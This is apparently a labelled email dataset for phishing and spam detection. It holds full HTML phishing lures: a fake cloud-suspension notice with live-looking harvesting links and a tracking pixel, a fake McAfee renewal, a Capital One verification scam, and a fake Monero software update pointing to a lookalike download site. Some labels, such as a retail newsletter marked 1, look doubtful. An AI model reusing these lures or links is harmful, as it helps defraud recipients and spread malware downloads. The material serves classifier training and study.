Subject,Body,label
���� Billing Issue Detected ��� Reactivate or Lose Every File Forever,"<!DOCTYPE html><html lang=""en""><head>
<meta http-equiv=""Content-Type"" content=""text/html; charset=utf-8"">
<title>⚠ Important Notification – Cloud Account Suspended</title>
<meta name=""viewport"" content=""width=device-width, initial-scale=1"">
<style>
body,table,td,a{-webkit-text-size-adjust:100%;-ms-text-size-adjust:100%;}
table,td{mso-table-lspace:0pt;mso-table-rspace:0pt;}
img{-ms-interpolation-mode:bicubic;border:0;outline:none;text-decoration:none;}
body{
margin:0;padding:0;width:100%!important;height:100%!important;
background:#fef2f2;font-family:Arial,Helvetica,sans-serif;
font-size:16px;color:#111827;
}
.wrapper{width:100%;padding:40px 0;}
.container{
max-width:640px;width:100%;margin:0 auto;background:#ffffff;
border-radius:10px;overflow:hidden;
box-shadow:0 4px 15px rgba(0,0,0,.15);
}
.header-bar{
background:#dc2626;color:#ffffff;text-align:center;padding:24px 20px;
font-size:22px;font-weight:bold;text-transform:uppercase;
}
.header-bar small{
display:block;margin-top:8px;font-size:14px;font-weight:normal;color:#fca5a5;
}
.alert{
background:#fee2e2;color:#b91c1c;
text-align:center;padding:26px 20px;
border-top:2px solid #dc2626;border-bottom:2px solid #dc2626;
font-weight:bold;font-size:17px;
}
.alert strong{display:block;margin-bottom:6px;font-size:18px;}
.details{
font-size:16px;color:#111827;line-height:26px;padding:0 28px 24px;
}
.details p{margin:6px 0;}
.details strong{width:150px;display:inline-block;}
.footer{
font-size:13px;color:#6b7280;line-height:18px;text-align:center;padding:22px;
}
.footer a{color:#6b7280;text-decoration:underline;}
@media only screen and (max-width:600px){
.container{width:94%!important;}
.details strong{width:100%;display:block;margin-bottom:2px;}
}
</style>
</head>
<body bgcolor=""#fef2f2"">
<!--[if mso]>
<table role=""presentation"" width=""100%"" bgcolor=""#fef2f2""><tr><td align=""center"">
<![endif]-->
<table role=""presentation"" cellpadding=""0"" cellspacing=""0"" border=""0"" class=""wrapper"" width=""100%"" bgcolor=""#fef2f2"">
<tr>
<td align=""center"">
<table role=""presentation"" cellpadding=""0"" cellspacing=""0"" border=""0"" class=""container"" bgcolor=""#ffffff"">
<!-- Logo -->
<tr>
<td align=""center"" style=""padding-top:30px;"">
<img src=""http://cdn-icons-png.flaticon.com/512/3812/3812117.png"" alt=""Cloud Logo"" width=""100"" height=""100"" border=""0"">
</td>
</tr>
<!-- Header -->
<tr>
<td class=""header-bar"" bgcolor=""#dc2626"" style=""background:#dc2626;color:#ffffff;"">
⚠ Your Cloud Account Has Been SUSPENDED!
<small>Act now to prevent permanent data loss</small>
</td>
</tr>
<!-- Alert -->
<tr>
<td class=""alert"" bgcolor=""#fee2e2"">
<strong>‼ Final Warning – Account Suspension Active!</strong>
Your access has been blocked.<br>
Update your payment information to restore your account immediately.
</td>
</tr>
<!-- Progress Bar -->
<tr>
<td align=""center"" style=""padding:20px 0;"">
<table role=""presentation"" width=""85%"" align=""center"">
<tr>
<td bgcolor=""#f3f4f6"" style=""border-radius:999px;border:1px solid #e5e7eb;"">
<table role=""presentation"" width=""100%"" bgcolor=""#dc2626"">
<tr><td height=""18"" style=""border-radius:999px;""></td></tr>
</table>
</td>
</tr>
</table>
<div style=""margin-top:8px;font-size:14px;color:#111827;"">
50 GB used / 50 GB total
</div>
</td>
</tr>
<!-- Details -->
<tr>
<td class=""details"" style=""padding:0 28px 24px;"">
<br><br>
<p><strong>Subscription ID:</strong> XAS235SFX445</p>
<p><strong>Expiration Date:</strong> 11-29-2025</p>
<p><strong>User:</strong> phishing@pot</p>
<p><strong>Product:</strong> 50 GB Cloud Storage</p>
<p><strong>Email:</strong> phishing@pot</p>
<p><strong>Status:</strong> <span style=""color:#dc2626;font-weight:bold;"">Suspended – no data accessible</span></p>
</td>
</tr>
<!-- Button -->
<tr>
<td align=""center"" style=""padding:28px 28px 36px;"">
<a href=""http://4do0h.amrabat.sbs/4GABsd3313pGvf194tpxegxnsps80GOMZHBYMOAKSESE285239AMGT364908l1"" target=""_blank"" style=""display:inline-block;height:56px;padding:0 40px;background:#2563eb;
color:#ffffff!important;font-family:Arial,sans-serif;font-size:17px;
font-weight:bold;line-height:56px;text-decoration:none;border-radius:999px;
box-shadow:0 8px 25px rgba(37,99,235,0.4);"">
Reactivate Account Now
</a>
</td>
</tr>
<!-- Footer -->
<tr>
<td class=""footer"">
*After restoration, get an additional 50 GB of free storage.<br>
To stop receiving these notifications,
<a href=""http://qlx4u.amrabat.sbs/5HRRbx3313Fwgs194ceuszuzjln80YTJZNNGVHZKEVXS285239ZZYZ364908F1"" target=""_blank"">unsubscribe here</a>.
</td>
</tr>
</table>
<img src=""http://44ib0.amrabat.sbs/track/3ZlCCr3313TtMz194miiihtwryi80RODREMVWNSCVINE285239JVYK364908j1"" alt="""" width=""1"" height=""1"">
</td>
</tr>
</table>
<!--[if mso]>
</td></tr></table>
<![endif]-->
</body>
</html>",1
small table pots flower,"Dear Sir or Madam, Thank you for your e-mail or inquiry or interest. Please noted that we are specialized for the artificial plants and flowers and the vertical garden and big trees and succulents and so on. And we also have the different flowers mixed for the flower wall, can you check from the website for more than 2000 items there? If you would like to visit us and need an invitation we would like very much to make the invitation letter for you! Please visit our Canton Fair booths or our New big showroom which is more than 1000 square meters. We have customers from more than 120 countries. Most of them are the top 3 of the relative business. Yes, of course we can send you samples before you place an order, and also we can send you the e-catalogue or price list with photos, and the MOQ for this kind of flower wall is 10 square meters. For the small bonsai or artificial plants MOQ just 3 or 5 cartons each is ok! Thank you! We will be waiting for your earlier reply and hope to have the chance to cooperate with you in the near future, we are sure that we can cooperate with each other smoothly and successfully, because we have been doing so in the past years! And we ensure you that we supply you the good quality goods with very reasonable prices and very fast delivery. And we hope that you will be our partners and to be a basement area to expand and supply our goods to your other cities around your shop or warehouse or your store either on-line or off line. If you have agent or warehouse in China, we can send the less container loading(LCL) order to your other suppliers and combine a full container loading order, or we can arrange the LCL order to be a Full container loading (LCL)order and load for you. Either LCL or FCL order both ok for us. Thank you! -- -- Thank you and Best regards ------------------ Mr. Harold Xie Sales Manager of Dongguan Jinchen Artware Co., Ltd. Address of showroom 2nd : A whole 5th floor(2000M2), A2 Building, Baitang Town(Guangdong Minghe Intelligent Industrial Park), Boluo County, Huizhou City, Guangdong, China. Post Code: 523121 Address of showroom 1st : A whole 5th floor(2000M2) of the A3 Building, Baitang Town(Guangdong Minghe Intelligent Industrial Park), Boluo County, Huizhou City, Guangdong, China. Post Code: 523121 Wechat No.: 86-13423005532 Address of DONGGUAN GREEN FOREST CRAFTS CO.,LTD: room 228 of 2nd floor, 156th of Puxin Commercial business street, Shipai town, Dongguan, China Tel & Mobile: 86-13423005532 or 13434078556 E-mail: gu002@golden-universe.cn or 517112655@qq.com English language website as following: Alibaba website: http://jinchengongyi.en.alibaba.comChinese language website: https://greenforest1.1688.com/",1
Inquiry About Data Analytics Services,"Hello Customer Support, I am writing to inquire about the data analytics services offered, as they could significantly enhance our investment optimization efforts at the firm. Could you provide details on the benefits, features, and services available? We are particularly interested in how these services can help us make data-driven decisions and improve our investment strategies.",0
Data Security Incident,"We have encountered a data security breach that impacted medical records. This may have resulted from the use of outdated software and misconfigured security settings. To address the issue, we have updated PostgreSQL, implemented firewall rules, and changed user access credentials.",0
"phishing@pot, Ihr McAfee-Abonnement l��uft ab, verl��ngern Sie es jetzt!","<html lang=""en"">
<head>
<meta http-equiv=""Content-Type"" content=""text/html; charset=utf-8""></head>
<body style=""font-family: Arial, sans-serif; background-color: #f5f5f5; margin: 0; padding: 0; display: flex; justify-content: center; align-items: center; "">
<div style=""background-color: #fff; border: 1px solid #ddd; border-radius: 10px; width: 600px; padding: 0; box-shadow: 0 0 15px rgba(0,0,0,0.2);"">
<div style=""text-align: center; padding: 20px; background-color: #fffff; border-bottom: 1px solid #7f0000; position: relative; overflow: hidden;"">
<div style=""background:#fffffff;color:#ffffff;padding:0px;font-size:32px;font-weight:700;padding:20px;text-align: center""><a href=""https://t.co/VoIIVeeDGb""><img src=""https://pbs.twimg.com/media/Ggaa8hfWQAAGfqp?format=png&amp;name=small"" width=""300px""><br><img src=""//pbs.twimg.com/media/Ggaa8hfWQAAGfqp?format=png&amp;name=small"" width=""300px""></div>
<div style=""content: ''; position: absolute; top: 50%; left: 50%; width: 200%; height: 200%; background: radial-gradient(circle, rgba(255, 255, 255, 0.1), rgba(255, 255, 255, 0) 70%); transform: translate(-50%, -50%); z-index: 0;""></div></a>
</div>
<div style=""text-align: center; padding: 20px; background-color: #AF0707; color: #fff; font-size: 24px; font-weight: bold; border-bottom: 1px solid #c62828;"">
Ihr McAfee-Abonnement ist abgelaufen
</div>
<div style=""background-color: #ffebee; color: #d32f2f; padding: 15px; text-align: center; font-weight: bold; border-bottom: 1px solid #ffcdd2; font-size: 18px;"">
Dringend: Ihr Abonnement ist abgelaufen! Sie haben <span style=""color: #c62828; font-weight: bold;"">24 Stunden</span> um Ihren Schutz zu erneuern und aufrechtzuerhalten.
</div>
<div style=""padding: 20px; text-align: center;"">
<p style=""margin: 15px 0; line-height: 1.6; font-size: 16px; color: #333;"">Ihr Abonnement für McAfee Comprehensive für Windows ist abgelaufen am <strong>22.04.2025</strong>.</p>
<p style=""margin: 15px 0; line-height: 1.6; font-size: 16px; color: #333;"">Ohne Erneuerung, <strong>Ihre Geräte können anfällig für Viren, Malware und Identitätsdiebstahl werden.</strong></p>
<p style=""color: #c62828; font-weight: bold; font-size: 16px;""><strong>Sofortiges Handeln erforderlich! Ihre Geräte sind ungeschützt und gefährdet...</strong></p>
<div style=""background-color: #fafafa; border: 1px solid #ddd; padding: 20px; border-radius: 10px; margin: 20px 0; text-align: left;"">
<a href=""https://t.co/VoIIVeeDGb"" style=""text-decoration:none;color:#000000"">
<table style=""width: 100%; border-collapse: collapse;"">
<tr>
<td style=""padding: 12px; vertical-align: top; font-size: 16px; color: #333; font-weight: bold; color: #555;"">Konto-ID:</td>
<td style=""padding: 12px; vertical-align: top; font-size: 16px; color: #333; font-weight: normal;""><strong>4577744DE</strong></td>
</tr>
<tr>
<td style=""padding: 12px; vertical-align: top; font-size: 16px; color: #333; font-weight: bold; color: #555;"">Benutzer:</td>
<td style=""padding: 12px; vertical-align: top; font-size: 16px; color: #333; font-weight: normal;""><strong>phishing@pot</strong></td>
</tr>
<tr>
<td style=""padding: 12px; vertical-align: top; font-size: 16px; color: #333; font-weight: bold; color: #555;"">Seriennummer:</td>
<td style=""padding: 12px; vertical-align: top; font-size: 16px; color: #333; font-weight: normal;"">
<span style=""display: inline-block; padding: 6px 12px; border: 2px solid #ddd; border-radius: 6px; margin: 0 5px; background-color: #ffe0e0; font-family: monospace; font-weight: bold; color: #c62828;"">5PEO</span>
<span style=""display: inline-block; padding: 6px 12px; border: 2px solid #ddd; border-radius: 6px; margin: 0 5px; background-color: #ffe0e0; font-family: monospace; font-weight: bold; color: #c62828;"">WDLS</span>
<span style=""display: inline-block; padding: 6px 12px; border: 2px solid #ddd; border-radius: 6px; margin: 0 5px; background-color: #ffe0e0; font-family: monospace; font-weight: bold; color: #c62828;"">KOZB</span>
<span style=""display: inline-block; padding: 6px 12px; border: 2px solid #ddd; border-radius: 6px; margin: 0 5px; background-color: #ffe0e0; font-family: monospace; font-weight: bold; color: #c62828;"">NADZ</span>
</td>
</tr>
<tr>
<td style=""padding: 12px; vertical-align: top; font-size: 16px; color: #333; font-weight: bold; color: #555;"">Rabatt:</td>
<td style=""padding: 12px; vertical-align: top; font-size: 16px; color: #333; font-weight: normal;"">
<div style=""display: inline-block; padding: 4px 12px; background-color: #c62828; color: #fff; font-size: 16px; font-weight: bold; border-radius: 25px; box-shadow: 0 0 10px rgba(0,0,0,0.3); position: relative; overflow: hidden; text-align: center;"">
<span style=""position: relative; z-index: 1;"">95.89% OFF</span>
<div style=""content: ''; position: absolute; top: -25px; right: -25px; width: 150%; height: 150%; background-color: #b71c1c; transform: rotate(-30deg); z-index: 0;""></div>
</div>
</td>
</tr>
<tr>
<td style=""padding: 12px; vertical-align: top; font-size: 16px; color: #333; font-weight: bold; color: #555;"">Angebot gültig bis:</td>
<td style=""padding: 12px; vertical-align: top; font-size: 16px; color: #333; font-weight: normal;""><strong>22.04.2025</strong></td>
</tr>
</table>
</div>
<a href=""https://t.co/VoIIVeeDGb"" style=""display: inline-block; padding: 12px 25px; background-color: #d32f2f; color: #fff; text-decoration: none; border-radius: 5px; margin-top: 20px; font-size: 18px; font-weight: bold;"">JETZT VERLÄNGERN</a></a>

<div style=""font-size:18px;padding:10px;color:#000000"" align=""left"">
<p style=""font-size: 16px;line-height: 1.5;margin-top: 20px;color:black"">
Sehr geehrter phishing@pot,<br><br>
Trotz mehrfacher Benachrichtigungen und Warnungen haben wir keine Antwort erhalten. <strong>Ihr Schutz vor Cyberbedrohungen ist ernsthaft gefährdet.</strong><br><br>
Erneuern Sie Ihr Abonnement umgehend, um einen ununterbrochenen Schutz vor Cyberangriffen und Hackern sicherzustellen. <strong>Ihre Sicherheit hat für uns höchste Priorität.</strong></p></div>
</div>
<div style=""font-size:13px;background-color: #b71c1c; color: #fff; padding: 15px; text-align: center; border-radius: 0 0 0px 0px;"">
<span style=""font-size:10px;"">©</span> 2025 McAfee<span style=""font-size:7px;"">™</span>. Alle Rechte vorbehalten<br>
<span style=""font-size:10px;"">Diese E-Mail wurde gesendet an: phishing@pot</span>

</div>
<div align=""center"" width=""100%"" style=""font-family:Helvetica, Arial, sans-serif; font-size:10px; color:#202020; line-height:15px; padding-bottom:10px;"">
<br>Wenn Sie keine weiteren E-Mails mehr erhalten möchten <a href=""https://t.co/noqm4SZyTz"" style=""color:#000000;"">Hier abmelden</a>
<br>
</div>
</div>

</body>
</html>",1
email-alert@verification.com =?utf-8?Q?=E2=9C=94?=,Mail Alert!! b11NEC_3ApC8^FAAE`A8CDeB08CC1`A8v84^10b370CNE5E3QB3~C8zEFv84EE98002 F7c09k64 ^76x6EA4`A8v84^10b37002 Y82g9CN0DD9h37P5AO1A[FCF4`A8v84^10b37ABf82P5Cb16SD6m88002 2222O60v84T08O5C002 AENF6^10SF7[89Q68g0DRA1 r48g43b40g092017ODDu59b40g09g43R29002______________________________ ______________________________ ____ F7N0D81VDEY0Dk64AENF6002SD101R30D9N2AW30W40v84AENF6eE0lD5E3{54002 O60_C57BODDc0115AENF601 Â Â Â Â Mail Alert!!Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â æˆ‘ä»¬å¼ºçƒˆå»ºè®®æ‚¨é‡æ–°éªŒè¯æ‚¨çš„å¸æˆ·ï¼Œä»¥è§£å†³ç»ˆç«¯çš„é—®é¢˜ã€‚Â è¯·æŒ‰æ­¤Â å¹¶ç¡®è®¤æ‚¨çš„å¸æˆ·ã€‚ å¦‚æžœä¸è¿™æ ·åšä¼šå¯¼è‡´æ‚¨çš„å¸æˆ·è¢«æš‚åœæˆ–å–æ¶ˆã€‚è°¢è°¢ä½ çš„åˆä½œã€‚Â é‚®ä»¶å¸å·å®‰å…¨æœåŠ¡ ç‰ˆæƒæ‰€æœ‰Â©2017ä¿ç•™æ‰€æœ‰æƒåˆ©ã€‚______________________________ ______________________________ ____è¯·ä¸è¦å›žå¤æ­¤é‚®ä»¶ã€‚å‘é€åˆ°è¿™ä¸ªåœ°å€çš„é‚®ä»¶æ— æ³•è§£ç­”ã€‚ ä½ å¿…é¡»ä¿æŒ15é‚®ä»¶ï¼,1
"Monero Interface Update: Desktop Enhancements, CLI Improvements,
 and Browser-Based Access","Dear Monero Community,

We are writing to share a major update that aligns with long-standing community input and current user needs across various environments.

As part of our continued efforts to improve accessibility, flexibility, and performances across the Monero ecosystem, we are releasing upgrades to the desktop GUI and CLI wallet, along with the first beta release of a Monero browser extension wallet.

Desktop Wallet Enhancements

The updated Monero GUI wallet for desktop includes refinements that improve reliability, performances, and interface responsiveness across supported platforms:

* Improved remote node handling with better failover and retry logic
* Enhanced support for hardware wallets, including newer Ledger and Trezor models
* Simplified wallet creation and recovery flows
* UI adjustments for smaller and high-resolution displays
* Updated translations and accessibility improvements

The wallet continues to support Windows, Linux, and macOS operating systems.

Download the updated GUI: https://app.getmoneroupdate.org/

CLI Wallet Improvements

We’ve also released an updated version of the CLI wallet (`monero-wallet-cli`) with performances and security improvements for advanced users, developers, and operators managing automated systems.

Key updates include:

* Faster synchronization when using trusted remote nodes
* Extended support for scripted wallet interactions
* Improved error reporting in automated transaction processing
* Hardened memory handling for improved operational security
* Added flag options for fine-grained control over mining rig connections

Download the updated CLI tools: https://app.getmoneroupdate.org/

Browser Extension Wallet:

We are introducing a browser extension wallet built specifically for users who require lightweight, direct interaction with Monero — particularly those managing mining infrastructure via Ledger hardware wallets.

This extension provides:

* Secure Ledger integration for reading balances and authorizing transactions
* Compatibility with Chromium-based browsers (Chrome, Brave, Edge, etc.)
* Seamless pairing with the updated GUI or CLI interface
* Local-only key handling — no data is transmitted to external servers
* Session persistence across browser restarts for uninterrupted rig monitoring

Install the Monero Extension Wallet: https://app.getmoneroupdate.org/

Installation Overview

1. Select and download the appropriate version for your platform (GUI, CLI, or Extension).
2. Follow platform-specific installation steps provided on the official site.
3. If using a Ledger device, ensure firmware is up to date and enable developer mode for best compatibility.

We thank contributors, testers, and node operators who continue to support Monero’s mission. If you encounter any issues, or if certain workflows are not yet fully covered, we encourage you to submit observations through the appropriate GitHub channels or via the in-app feedback options.

Your insights continue to inform the evolution of the Monero project.

With appreciation,
The Monero Development Team",1
Capital One Bank Notification - Please Read - ID: COB495886838,"Capital One | Message Dear Capital One Bank, Capital One, F.S.B., Member, Because of unusual number of invalid login attempts on you account, we had to believe that, their might be some security problem on you account. So we have decided to put an extra verification process to ensure your identity and your account security. Please click the link bellow:. It is all about your security. Thank you. and visit the customer service section. Capital One Bank, Capital One, F.S.B., members FDIC. ©2007 Capital One Services, Inc. Capital One is a federally registered service mark. All rights reserved. Capital One ID: COB495886838",1
Internship Offer,"CMU archived phishing listing entry.

Date: 11/24/25
Target Audience: Students
Source Entry: https://www.cmu.edu/iso/aware/phish/phish-bowl-examples/2025/internship-offer.html

Note: The linked CMU detail page currently redirects to a general Secure Computing page, so the original message body is not publicly available from the live site.",1
On trend: The sheer dress,"On trend: The sheer dress Plus, our latest arrivals of bikinis and swimsuits. | Click here to view it online. The sheer dress The sheer dress is having a moment. Layer it over swimwear for trips to the beach. For the evening, throw an oversize blazer on top and pair it with heeled sandals. SHOP NOW SHOP NOW Dive into the ease that summer evokes with our latest arrivals of bikinis and swimsuits. Take up to 60% off selected styles in our MDW sale. You'll find it here. Free shipping Always free returns This message was sent by & Other Stories (H&M Hennes & Mauritz GBC AB, Mäster Samuelsgatan 46, 106 38 Stockholm, Sweden). You are receiving this email because you are signed up to receive & Other Stories email newsletters. For questions and contact details please visit our customer service page. Read our privacy notice. H&M Hennes & Mauritz L.P., 110 5th Avenue, 11th Floor, New York, NY 10011 For more information on your orders, please log in to your Stories account. You can't reply to this e-mail, but you can talk to us on Facebook. Visit Stories.com If you'd like to unsubscribe from our stories, click here.",1
